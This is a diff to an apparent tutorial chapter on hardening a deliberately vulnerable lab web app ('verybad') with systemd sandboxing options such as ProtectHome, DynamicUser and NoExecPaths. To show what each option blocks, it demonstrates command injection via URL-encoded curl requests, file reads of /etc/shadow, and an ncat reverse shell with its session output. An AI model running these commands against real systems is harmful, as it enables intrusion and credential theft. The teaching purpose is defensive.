@@ -448,7 +448,7 @@ Now, we will use an web application I developed to learn.  It is called `verybad
 do not run it in your laptop or main system. If you want try it out and follow
 along the steps, please do it in a VM.
 
-.. note:: All of the following steps are done in a `AlmaLinux <https://almalinux.org/>`_ 8 virtual machine.
+.. note:: All of the following steps are done in a `Fedora 35 <https://getfedora.org>`_  virtual machine.
 
 
 Installing verybad service
@@ -558,11 +558,11 @@ internally returning us the content of the `/etc/os-release` file.
   VARIANT_ID=cloud
 
 
-Directory traversal vulnerability
-----------------------------------
+Directory traversal vulnerability/ LFI
+---------------------------------------
 
 `Directory traversal
-<https://portswigger.net/web-security/file-path-traversal>`_ is first
+<https://portswigger.net/web-security/file-path-traversal>`_ or Local File inclusion is the first
 vulnerability we are going to look into. A **GET** request to `/filename` will give us the file. Let us read the `/etc/shadow`
 file using this.
 
@@ -662,11 +662,298 @@ running the service as `root` by default.
 
 ::
 
-  $ curl  http://localhost:8000/exec/id
+  $ curl http://localhost:8000/exec/id
   uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
   $ curl  http://localhost:8000/exec/ls%20%2Froot
   anaconda-ks.cfg
   original-ks.cfg
 
-Through out rest of the chapter, we will learn how to migiate these 3 kinds of vulnerabilities using systemd's builtin
-features.
+Through out rest of the chapter, we will learn how to migiate these 3 kinds of
+vulnerabilities using systemd's builtin features.
+
+Remove access to system's tmp directory
+----------------------------------------
+
+One of the very initial thing we can do is to provide a private temporary
+directory structure only to the service. If we set `PrivateTmp=yes`, it will
+create a new file system namespace for the service & will mount private `/tmp` &
+`/var/tmp` inside of it. This option is only available for system services.
+
+Only using `PrivateTmp` does not provide special security, but it stops the
+chances where the service can write to a temporary file/socket created by
+another service.
+
+Protecting home dirctories
+---------------------------
+
+We can also use `ProtectHome=` to secure home directories in the system. It is
+set to true like `ProtectHome=yes`, then `/root`, `/home` & `/run/user` are
+empty & inaccessible. We can also set them as read only by doing
+`ProtectHome=read-only`. The third available option is `tmpfs`, which mounts
+temporary filesytem to those directories. For any long running service, we must
+enable this feature.
+
+
+Let us see how this affects our service. First we update the service file.
+
+.. code-block:: ini
+
+  [Unit]
+  Description=Very Bad Web Application
+  After=network.target
+
+  [Service]
+  Type=simple
+  WorkingDirectory=/web/amazing
+  ExecStart=/usr/sbin/verybad
+  Restart=always
+  ProtectHome=yes
+  PrivateTmp=yes
+
+  [Install]
+  WantedBy=multi-user.target
+
+
+We will have to reload the daemon & restart the service for the changes in effect.
+
+::
+
+  # systemctl daemon-reload
+  # systemctl restart verybad
+
+
+Now we will try to execute `ls` command against `/root`, `/home/fedora` & `/tmp` directory.
+You will notice that the tool can not see any file in those directories.
+
+
+::
+
+  $ curl  http://localhost:8000/exec/ls%20%2Froot
+  $ curl  http://localhost:8000/exec/ls%20%2Fhome%2Ffedora
+  $ curl  http://localhost:8000/exec/ls%20%2Ftmp
+
+
+Fixing directory paths
+-----------------------
+
+systemd also provides various sandboxing options for runtime/configuration/state/logging directories for any service, and those are available to the service as
+environment variables too.
+You can specify them via the following options:
+
+.. list-table:: Directory configuration
+  :header-rows: 1
+
+  * - Directory
+    - Path for system units
+    - Environment variable
+
+  * - RuntimeDirectory=
+    - /run/
+    - $RUNTIME_DIRECTORY
+  * - StateDirectory=
+    - /var/lib/
+    - $STATE_DIRECTORY
+  * - CacheDirectory=
+    - /var/cacche/
+    - $CACHE_DIRECTORY
+
+  * - LogsDirectory=
+    - /var/logs/
+    - $LOGS_DIRECTORY
+  * - ConfigurationDirectory=
+    - /etc/
+    - $CONFIGURATION_DIRECTORY
+
+
+DynamicUser
+-----------
+
+This is a very powerful option, takes a boolean value. If set to `yes` a user &
+group will be dynamically added. This value will not be showed up in the
+`/etc/passwd` or in `/etc/group` files. It also means `ProtectSystem=strict` &
+`ProtectHome=read-only`. `PrivateTmp` is also implied. Two new options will also
+be implied,  `NoNewPrivileges=` and `RestrictSUIDSGID=`. These options make sure
+the actual service process can not create SUID/SGID files or use them.
+
+Let us enable DynamicUser and have a state directory and move us to that StateDirectory as WorkingDirectory.
+
+
+.. code-block:: ini
+
+  [Unit]
+  Description=Very Bad Web Application
+  After=network.target
+
+  [Service]
+  Type=simple
+  ExecStart=/usr/sbin/verybad
+  Restart=always
+  DynamicUser=yes
+  StateDirectory=verybad
+  WorkingDirectory=/var/lib/verybad
+
+  [Install]
+  WantedBy=multi-user.target
+
+
+The StateDirectory is now `/var/lib/verybad`, but because we are having a
+DynamicUser, it is actually under `/var/lib/private` and symlinked to
+`/var/lib/verybad`. We can see if we check the index page once again.
+
+
+::
+
+  $ curl http://localhost:8000/
+  Example of poorly written code.
+      GET /getos -> will give the details of the OS.
+      GET /filename -> will provide a file from the current directory
+      GET /exec/date -> will give you the current date & time in the server.
+      POST /filename -> Saves the data in filename.
+      Code is running in: /var/lib/private/verybad
+
+
+We can also check details about the `user` the service is running as and try to write to some files or execute commands or read some files.
+
+::
+
+  $ curl http://localhost:8000/exec/id
+  uid=65445(verybad) gid=65445(verybad) groups=65445(verybad) context=system_u:system_r:unconfined_service_t:s0
+  $ curl -d '42 is the answer.'  http://localhost:8000/%2Fvar%2Flib%2Fverybad%2Fexample
+  Okay
+  $ curl http://localhost:8000/%2Fvar%2Flib%2Fverybad%2Fexample
+  42 is the answer.
+
+We can still create a reverse shell in this setup. In one terminal use `nc` to listen for connection on port 5555 and use `ncat` command to connect to it.
+
+::
+
+  $ nc -nlv 5555
+  Listening on 0.0.0.0 5555
+
+Now, use `curl` to fire up `ncat` & connect to this. We have the command `ncat 127.0.0.1 5555 -e /bin/bash` URL encoded.
+
+::
+
+  $ curl http://localhost:8000/exec/ncat%20127.0.0.1%205555%20-e%20%2Fbin%2Fbash
+
+
+Now, if you go back you can see a connection has been established.
+
+::
+
+  Connection received on 127.0.0.1 54056
+  id
+  uid=65445(verybad) gid=65445(verybad) groups=65445(verybad) context=system_u:system_r:unconfined_service_t:s0
+  pwd
+  /var/lib/private/verybad
+  ls /tmp
+  cp /usr/bin/ls /tmp/
+  ls -l /tmp/ls
+  -rwxr-xr-x. 1 verybad verybad 141816 Mar 30 09:41 /tmp/ls
+  chmod u+s /tmp/ls
+  ls -l /tmp/ls
+  -rwxr-xr-x. 1 verybad verybad 141816 Mar 30 09:41 /tmp/ls
+  cat /etc/passwd
+  root:x:0:0:root:/root:/bin/bash
+  bin:x:1:1:bin:/bin:/sbin/nologin
+  daemon:x:2:2:daemon:/sbin:/sbin/nologin
+  adm:x:3:4:adm:/var/adm:/sbin/nologin
+  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+  sync:x:5:0:sync:/sbin:/bin/sync
+  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+  halt:x:7:0:halt:/sbin:/sbin/halt
+  mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+  operator:x:11:0:operator:/root:/sbin/nologin
+  games:x:12:100:games:/usr/games:/sbin/nologin
+  ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+  nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+  dbus:x:81:81:System message bus:/:/sbin/nologin
+  systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
+  systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+  systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
+  systemd-timesync:x:998:998:systemd Time Synchronization:/:/usr/sbin/nologin
+  systemd-coredump:x:997:997:systemd Core Dumper:/:/usr/sbin/nologin
+  tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+  unbound:x:996:995:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+  sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+  chrony:x:995:994::/var/lib/chrony:/sbin/nologin
+  fedora:x:1000:1000:fedora Cloud User:/home/fedora:/bin/bash
+
+See if you can esclate to `root` from this shell :)
+
+Allowed Executables
+-------------------
+
+We can further lock down the service using the `NoExecPaths` and `ExecPaths`
+configuration. `NoExecPaths=` will let us set paths from which (if directory) or
+the files themselves will not be allowed to execute. And then we can only
+mention the execuables we want to allow. This should also include any library
+which will be mapped to memory as exec.
+
+In our case we have to find out the libraries we are linked against and same for
+any executable we need, that is `/usr/bin/date`.  Let us use `ldd` command to
+find this information. We will also need `/usr/lib/systemd/systemd` in the allow list.
+
+::
+
+  $ ldd /usr/bin/date
+  linux-vdso.so.1 (0x00007ffe9c7f9000)
+  libc.so.6 => /lib64/libc.so.6 (0x00007f08ac188000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f08ac3b3000)
+  $ ldd /usr/sbin/verybad
+  linux-vdso.so.1 (0x00007ffd0b9a9000)
+  libgcc_s.so.1 => /lib64/libgcc_s.so.1 (0x00007fe39ccc4000)
+  libm.so.6 => /lib64/libm.so.6 (0x00007fe39cbe8000)
+  libc.so.6 => /lib64/libc.so.6 (0x00007fe39c9de000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007fe39d082000)
+
+Let us add these in our service file & put `/` in `NoExecPaths`.
+
+.. code-block:: ini
+
+  [Unit]
+  Description=Very Bad Web Application
+  After=network.target
+
+  [Service]
+  Type=simple
+  ExecStart=/usr/sbin/verybad
+  Restart=always
+  DynamicUser=yes
+  StateDirectory=verybad
+  WorkingDirectory=/var/lib/verybad
+  NoExecPaths=/
+  ExecPaths=/usr/sbin/verybad /usr/lib/systemd/systemd /lib64/ld-linux-x86-64.so.2 /lib64/libgcc_s.so.1 /lib64/libm.so.6 /lib64/libc.so.6 /usr/bin/date
+
+  [Install]
+  WantedBy=multi-user.target
+
+
+Then `daemon-reload` & `restart` the service. & we will try the `curl` command once again.
+
+::
+
+  $ sudo systemctl daemon-reload
+  $ sudo systemctl restart verybad
+  $ curl http://localhost:8000/exec/date
+  Wed Mar 30 10:11:49 AM UTC 2022
+  $ curl http://localhost:8000/exec/ncat%20127.0.0.1%205555%20-e%20%2Fbin%2Fbash
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="utf-8">
+      <title>500 Internal Server Error</title>
+  </head>
+  <body align="center">
+      <div role="main" align="center">
+          <h1>500: Internal Server Error</h1>
+          <p>The server encountered an internal error while processing this request.</p>
+          <hr />
+      </div>
+      <div role="contentinfo" align="center">
+          <small>Rocket</small>
+      </div>
+  </body>
+  </html>
+
+To learn more read the man page via `man systemd.exec <https://www.freedesktop.org/software/systemd/man/systemd.exec.html>`_.
